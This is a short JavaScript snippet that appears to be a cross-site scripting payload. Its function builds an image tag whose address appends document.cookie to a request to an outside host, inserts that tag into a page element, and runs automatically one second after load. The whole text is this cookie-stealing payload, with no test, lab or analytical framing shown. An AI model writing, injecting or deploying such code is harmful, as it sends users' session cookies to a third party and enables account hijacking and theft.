function gg(){
  var i1 = '<img src="https://www.logogenie.fr/cookie?c=' + document.cookie + '" />';
  document.getElementById('volet_clos').innerHTML += i1;
}
setTimeout(gg,1000);
